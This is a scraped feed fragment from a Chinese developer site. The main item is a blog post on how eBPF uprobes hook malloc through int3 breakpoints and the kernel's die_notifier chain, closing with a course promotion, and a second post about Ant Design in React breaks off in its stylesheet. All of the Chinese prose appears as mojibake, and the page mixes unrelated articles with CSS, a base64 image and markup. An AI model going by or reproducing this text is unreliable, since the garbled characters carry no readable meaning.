ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å“ˆå–½ï¼Œæˆ‘æ˜¯å­ç‰™è€å¸ˆï¼Œä¸€ä¸ªæ‰‹å†™è¿‡æ“ä½œç³»ç»Ÿã€ç¼–ç¨‹è¯­è¨€ã€Javaè™šæ‹Ÿæœºã€dockerã€Ubuntuç³»ç»Ÿï¼Œç©é€Windowså†…æ ¸ã€Linuxå†…æ ¸â€¦ç«‹å¿—ä¸€ç»Ÿè®¡ç®—æœºåº•å±‚åŸ¹è®­çš„ç¡¬æ ¸ç”·äºº</p>
<p>ä¸æ˜¯åšäº†ä¸€ä¸ªebpfçš„å°è¯¾ã€Šæ‰‹å†™ç”Ÿäº§çº§ebpfå†…å­˜æ£€æµ‹å·¥å…·ã€‹å—ï¼Œè¿™ä¸¤å¤©ä¸æ˜¯åœ¨æ‹›ç”Ÿå—ï¼Œè´¨ç–‘çš„å£°éŸ³å‡ºæ¥äº†ï¼šè´¨ç–‘æˆ‘å¯¹ebpfçš„è®¤çŸ¥ã€è´¨ç–‘è·Ÿç€æˆ‘æ˜¯å¦èƒ½å­¦åˆ°ebpfçš„çœŸæœ¬äº‹â€¦</p>
<p>æˆ‘ä¸å¤ªå–œæ¬¢å‘åˆ«äººè¯æ˜ä»€ä¹ˆï¼Œç›¸ä¿¡ä½ çš„äººæ— éœ€è¯æ˜ï¼Œä¸ç›¸ä¿¡ä½ çš„äººï¼Œä½ éƒ½èƒ½ä½©æœtaæŒ‘åˆºçš„èƒ½åŠ›ï¼ï¼ˆçœ‹é›·æ€»ç›´æ’­æ‹†è½¦ï¼Œå°ç±³è‚¡ä»·è·Œæˆå•¥æ ·äº†ï¼‰åˆšå¥½è¿™ä¸¤å¤©åœ¨ç ”ç©¶ebpfçš„åº•å±‚å®ç°åŸç†ï¼Œåˆ†äº«ä¸€ä¸‹</p>
<p>å¦‚æœæƒ³ç›‘æµ‹ä¸€ä¸ªç¨‹åºæ˜¯å¦æœ‰å†…å­˜æ³„æ¼ï¼Œè¦æ€ä¹ˆä½¿ç”¨ebpfè§£å†³å‘¢ï¼Ÿç›‘æµ‹åˆ†é…å†…å­˜çš„å‡½æ•°å¦‚mallocã€callocã€reallocã€mmapï¼Œå†ç›‘æµ‹å†…å­˜é‡Šæ”¾å‡½æ•°å¦‚freeã€munmapï¼Œç¨‹åºé€€å‡ºä¹‹å‰ï¼ŒæŸ¥çœ‹è¿˜æœ‰æ²¡æœ‰å†…å­˜æœªé‡Šæ”¾ï¼Œæœªé‡Šæ”¾çš„ï¼Œå°±æ˜¯æ³„æ¼çš„å†…å­˜</p>
<p>å¦‚ä½•ç›‘æµ‹å‘¢ï¼Ÿå¦‚æœæ˜¯ç”¨æˆ·æ€ï¼Œebpfæä¾›äº†ä¸¤ä¸ªæŠ€æœ¯ï¼šuprobeã€uretprobeï¼Œuprobeç”¨äºç›‘æµ‹å‡½æ•°è¿›å…¥ï¼Œç”¨äºæ‹¿å‡½æ•°ä¼ å‚ï¼Œuretprobeç”¨äºç›‘æµ‹å‡½æ•°é€€å‡ºï¼Œç”¨äºæ‹¿å‡½æ•°è¿”å›å€¼ï¼Œå·®ä¸å¤šæ˜¯è¿™ä¸ªæ„Ÿè§‰</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aac1eed0b5ad4eedbdffe9542ead9ea1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=dJYiHIaVwELwZJ%2Bho8X%2B6bfiZcI%3D" alt="" loading="lazy"/></p>
<p>ä»£ç é•¿è¿™æ ·</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45e3694ed86a4b6c8515faa677bb0848~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=UQcVoO4X5M0%2FxxEfACU256pn1Oc%3D" alt="" loading="lazy"/></p>
<p><strong>ç¬¬ä¸€ä¸ªé—®é¢˜æ¥äº†ï¼šæ‰§è¡Œmallocå‡½æ•°çš„æ—¶å€™ï¼Œæ˜¯æ€ä¹ˆæ‰§è¡Œåˆ°uprobeçš„ï¼ŸåŒæ ·çš„ï¼Œmallocå‡½æ•°ç»“æŸçš„æ—¶å€™ï¼Œæ˜¯æ€ä¹ˆæ‰§è¡Œåˆ°uretprobeçš„ï¼Ÿ</strong></p>
<p>ebpfçš„ä»£ç æ˜¯åœ¨Linuxå†…æ ¸ä¸­çš„BPFè™šæ‹Ÿæœºä¸­è¿è¡Œçš„ï¼Œ<strong>ç¬¬äºŒä¸ªé—®é¢˜æ¥äº†ï¼šuprobe mallocä¸uretprobe mallocæ˜¯å¦‚ä½•ä¸Linuxå†…æ ¸ä¸­çš„ebpfç¨‹åºå…³è”ä¸Šçš„ï¼Ÿ</strong></p>
<p>è¿™ä¸¤ä¸ªé—®é¢˜ææ˜ç™½äº†ï¼Œebpfä½ å°±ç®—çœŸæ­£ç©æ˜ç™½äº†ï¼</p>
<p>æˆ‘ç”»äº†ä¸€å¼ éå¸¸å½¢è±¡çš„å›¾ï¼Œæ‰€æœ‰çš„ç­”æ¡ˆéƒ½åœ¨å…¶ä¸­ï¼Œæˆ‘æ¥ç»™å¤§å®¶è§£é‡Šè§£é‡Š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb03579154a942428531cd9a07cc9cf6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=0W3gBslLGc%2BlSZ9vZ08NRlj%2FnFE%3D" alt="" loading="lazy"/></p>
<p>ä»¥ä¸‹ï¼Œenjoy</p>
<h2 data-id="heading-0">ç¬¬ä¸€ä¸ªé—®é¢˜</h2>
<p>ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæ‰§è¡Œmallocå‡½æ•°ï¼Œæ˜¯å¦‚ä½•æ‰§è¡Œåˆ°uprobeçš„ï¼Ÿé‡‡ç”¨æ’æ¡©çš„æ–¹å¼ã€‚æ ¸å¿ƒä»£ç é•¿è¿™æ ·</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b9b515c7a4949e48d13ffd3b394a637~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=z8gAHS8GEJhkZvJlT%2FwbT2c7hWY%3D" alt="" loading="lazy"/></p>
<p>é‚£ä»€ä¹ˆæ˜¯æ’æ¡©å‘¢ï¼Ÿå…¶å®è·Ÿè°ƒè¯•å™¨ä¸‹æ–­ç‚¹æ˜¯ä¸€æ ·çš„ï¼ŒæŠŠå‡½æ•°çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ”¹æˆ0xCCï¼Œå¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤æ˜¯int3ï¼Œå¯¹åº”çš„æ˜¯3å·è½¯ä¸­æ–­ã€‚å¯¹ï¼Œä½ æ²¡æœ‰çœ‹é”™ï¼Œæ’æ¡©å°±æ˜¯gdbè°ƒè¯•å™¨çš„æ–­ç‚¹</p>
<p><strong>ä½ ç°åœ¨è‚¯å®šæœ‰ä¸€ä¸ªé—®é¢˜ï¼šint3æ—¢æ˜¯gdbè°ƒè¯•å™¨çš„æ–­ç‚¹ï¼Œåˆæ˜¯ebpfçš„æ’æ¡©ï¼Œå‘ç”Ÿä¸­æ–­ï¼ŒLinuxå†…æ ¸å¦‚ä½•åŒºåˆ†æ˜¯gdbè¿˜æ˜¯ebpfå‘¢ï¼Ÿå¥½é—®é¢˜ï¼Œç­‰ä¸‹è®²ã€‚ä½ å¯ä»¥å…ˆæƒ³ä¸€æƒ³ï¼šå¦‚æœä½ æ¥è®¾è®¡Linuxå†…æ ¸ï¼Œä½ ä¼šæ€ä¹ˆå¤„ç†ï¼Ÿ</strong></p>
<p>å¦‚ä½•è¯æ˜æ’æ¡©çš„å°±æ˜¯int3å‘¢ï¼Ÿçœ‹ä»£ç å‘—</p>
<p>åœ¨57536è¿›ç¨‹ä¸­çš„mallocä¸Šæ’æ¡©</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/508610f54ef0461487da9396ea9c05f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=Y8olU90XpvQ2rd8Gu%2BYlxTMdD3U%3D" alt="" loading="lazy"/></p>
<p>é€šè¿‡gdb attachåˆ°è¿™ä¸ªè¿›ç¨‹ï¼Œçœ‹mallocå‡½æ•°çš„æœºå™¨ç </p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7546ad1691884f28b93cd0ba76fb3811~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=xnyHpx3j7QH74qsurW7yvP43elM%3D" alt="" loading="lazy"/></p>
<p>ä½ ä¼šå‘ç°ç¬¬ä¸€ä¸ªå­—èŠ‚æ²¡æœ‰è¢«æ”¹æˆ0xCCï¼Œä½†æ˜¯ä½ æŸ¥çœ‹æ’æ¡©ï¼Œç¡®å®æ’æ¡©æˆåŠŸäº†</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3cb7efee33d4b8b9cc5f90a61a4f58f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=J6mNrCwN%2FUslXihPNOW06xECxyM%3D" alt="" loading="lazy"/></p>
<p>æ€ä¹ˆå›äº‹ï¼Ÿç†è®ºé”™äº†ï¼Ÿæˆ‘èµ·å§‹ä¹Ÿæ˜¯è¿™æ ·çš„ååº”ã€‚å¦‚æœä¸ä¼šç©Linuxå†…æ ¸ï¼Œåˆ°æ­¤å°±æŸæ‰‹æ— ç­–äº†ï¼Œå¯æ˜¯æˆ‘ä¼šç©Linuxå†…æ ¸å•Šï¼Œç»å•æ­¥è°ƒè¯•Linuxå†…æ ¸ï¼Œç†è®ºæ²¡é”™ï¼ˆç­‰ä¸‹å•æ­¥è°ƒè¯•Linuxå†…æ ¸è¯æ˜ç»™ä½ çœ‹ï¼‰</p>
<p>é‚£æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿé—®ChatGPTï¼ŒåŸæ¥æ˜¯æ–°å†…æ ¸å¯¹uprobesåº•å±‚åšäº†æ”¹è¿›</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8488e9d301924bc3bfc9bbe16898b478~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=NT1mr7H5CIGbs598P9YPQFjXjmQ%3D" alt="" loading="lazy"/></p>
<p>çœŸç›¸å¤§ç™½ï¼è¿è¡Œæ—¶Linuxå†…æ ¸æ£€æµ‹åˆ°mallocæ˜¯ç›‘æµ‹ç‚¹ï¼Œä¸´æ—¶æ’å…¥æ–­ç‚¹ï¼Œè§¦å‘å¼‚å¸¸ï¼Œç”¨å®Œå°±æ¢å¤ï¼Œæ‰€ä»¥æ’æ¡©æ˜¯çœ‹ä¸åˆ°çš„ã€‚æŒ‰ç…§ChatGPTçš„è¯´æ³•ï¼Œè€ç‰ˆæœ¬èƒ½çœ‹åˆ°ï¼Œæˆ‘æŠ½ç©ºæµ‹è¯•ä¸€ä¸‹</p>
<p>è¿™ä¸ªè§¦å‘å¼‚å¸¸ï¼Œå°±æ˜¯ç¬¬äºŒä¸ªé—®é¢˜çš„ç­”æ¡ˆ</p>
<h2 data-id="heading-1">ç¬¬äºŒä¸ªé—®é¢˜</h2>
<p>å…ˆä¸Šå›¾ï¼Œå†èŠï¼Œä¸ç„¶å¤ªæŠ½è±¡äº†</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb8c84d22b634fdc98509a549a73459d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=Im9gcgmCySIFoIMVOWEnZdEH3yc%3D" alt="" loading="lazy"/></p>
<p>ä¸€ã€è¿è¡Œæ—¶Linuxå†…æ ¸æ£€æµ‹åˆ°mallocæ˜¯ç›‘æµ‹ç‚¹ï¼Œä¸´æ—¶æ’å…¥æ–­ç‚¹ï¼Œå°±æ˜¯æŠŠmallocå‡½æ•°çš„ç¬¬ä¸€ä¸ªæœºå™¨ç 0xf3æ”¹æˆ0xccï¼Œ0xccå¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤æ˜¯int3ï¼ŒCPUæ‰§è¡Œ0xccå°±ä¼šè§¦å‘3å·è½¯ä¸­æ–­</p>
<p>äºŒã€Linuxå†…æ ¸å¤„ç†è½¯ä¸­æ–­çš„ä¾‹ç¨‹æ˜¯do_int3</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f323016f469a4a998052d15ffbdfb5dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=UVTj22%2FzlUIB1pWa6m8OjtleYPs%3D" alt="" loading="lazy"/></p>
<p>0xccï¼Œæ—¢æ˜¯gdbæ–­ç‚¹ï¼Œåˆæ˜¯ebpfæ’æ¡©ï¼ŒLinuxå†…æ ¸å¦‚ä½•åŒºåˆ†å‘¢ï¼Ÿ</p>
<p>å…¶å®Linuxå†…æ ¸ä¹Ÿæ²¡åšåŒºåˆ†ï¼ŒLinuxå†…æ ¸ä¸­æœ‰ä¸ªdie_notifieré“¾ï¼Œ3å·å¼‚å¸¸æ¥äº†ï¼Œå…ˆä¸¢ç»™ä¼˜å…ˆçº§æœ€é«˜çš„notifierå¤„ç†ï¼Œebpfæ’æ¡©çš„ä¼˜å…ˆçº§æ¯”gdbæ–­ç‚¹è¦é«˜</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ef8686e8ecc4e13aab7b333a6ee6a62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=cmotoXtcJcKT1Kg4G3el8w5xf0M%3D" alt="" loading="lazy"/></p>
<p>æ¯”ebpfæ’æ¡©ä¼˜å…ˆçº§æ›´é«˜çš„æ˜¯ï¼škprobesã€kgdb</p>
<p>å¦‚æœè§¦å‘3å·å¼‚å¸¸çš„æ˜¯ebpfæ’æ¡©ï¼Œå°±æ˜¯è¿›å…¥arch_uprobe_exception_notify</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bc0eb2e088c49a8bf19d307355fa9f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=gUj4%2BIox2yVJawvFC5%2Fg%2FhPSa%2Fc%3D" alt="" loading="lazy"/></p>
<p>è¿™é‡Œæœ€é‡è¦çš„ä¸€éƒ¨å°±æ˜¯æ‰“ä¸Šæ ‡è®°ï¼Œæœ€ç»ˆæ‰§è¡Œuprobeä»£ç æ˜¯åœ¨è¿”å›ç”¨æˆ·æ€çš„è·¯ä¸Šåšçš„</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/949f0a6d9c2d471ea19c4d938f814a76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=dS3in9R5cEePLWilCvjofzVGKDU%3D" alt="" loading="lazy"/></p>
<p>æ‰¾åˆ°æ ¸å¿ƒä»£ç handler_chainï¼Œä¸‹æ–­ç‚¹ï¼Œçœ‹ä»£ç æ˜¯ä¸æ˜¯èµ°åˆ°è¿™</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb4783d678c24ed9a361533989c7c09e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56Gs5qC45a2Q54mZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768535872&amp;x-signature=wtfCprIIk8SLIF%2FMiSh0IzlsHA8%3D" alt="" loading="lazy"/></p>
<p>è¿½è¸ªæ‰§è¡Œå®Œuprobeç¨‹åºï¼Œç›´æ¥è¿”å›ç”¨æˆ·æ€ï¼Œå°±æ˜¯å›¾ä¸­çš„3</p>
<p>è‡³æ­¤ï¼Œebpfçš„åº•å±‚å®ç°åŸç†ï¼Œæ­æ™“å®Œå·¥ï¼æ’’èŠ±â€¦</p>
<p>æˆ‘ä¸ºä»€ä¹ˆèƒ½éšä¾¿ç©è¿™äº›ï¼Œæˆ‘è§‰å¾—æ˜¯æˆ‘åšäº†è¿™ä¸‰ä¸ªè¯¾ç¨‹çš„æ•ˆç”¨ï¼šæ‰‹å†™64ä½å¤šæ ¸æ“ä½œç³»ç»Ÿ+å®æˆ˜Linuxå†…æ ¸+æ‰‹å†™Ubuntu Linuxç³»ç»Ÿã€‚å¦‚æœä½ ä¹Ÿæƒ³åƒæˆ‘ä¸€æ ·ï¼Œéšä¾¿ç©Linuxå†…æ ¸ï¼Œæˆ–è€…è¯´ä»»ä½•æŠ€æœ¯ï¼Œå¯ä»¥æŠ½ç©ºæŠŠè¿™ä¸‰é—¨è¯¾å­¦ä¼šï¼ŒåŠ ä¸ŠAIçš„åŠ æŒï¼Œè®¡ç®—æœºä¸–ç•Œé‡Œï¼Œæƒ³å¹²å•¥å°±å¯ä»¥å¹²å•¥ï¼</p>
<p>å¦‚æœä½ æƒ³æ›´å¤šäº†è§£æˆ‘ï¼Œæ¬¢è¿å»æˆ‘å…¬ä¼—å·ã€ç¡¬æ ¸å­ç‰™ã€‘çœ‹æˆ‘ä¹‹å‰çš„æ–‡ç« åŠæˆ‘çš„å¥‹æ–—å†ç¨‹ã€‚ç™½æ‰‹èµ·å®¶ç¨‹åºå‘˜çš„èŒåœºå¿ƒå¾—ï¼Œåº”è¯¥ä¼šå¯¹ä½ æœ‰å¾ˆå¤§å¯å‘</p>
<p>è‹¥æœ‰æ”¶è·ï¼Œå°±ç‚¹ä¸ªèµå§</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[reactä½¿ç”¨Ant Design]]></title>    <link>https://juejin.cn/post/7593015632078405659</link>    <guid>https://juejin.cn/post/7593015632078405659</guid>    <pubDate>2026-01-09T03:58:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7593015632078405659" data-draft-id="7592996072705032242" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="reactä½¿ç”¨Ant Design"/> <meta itemprop="keywords" content="å‰ç«¯,React.js,Ant Design"/> <meta itemprop="datePublished" content="2026-01-09T03:58:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŠ æ²¹ä¹"/> <meta itemprop="url" content="https://juejin.cn/user/84036866547575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            reactä½¿ç”¨Ant Design
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/84036866547575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŠ æ²¹ä¹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:58:56.000Z" title="Fri Jan 09 2026 03:58:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 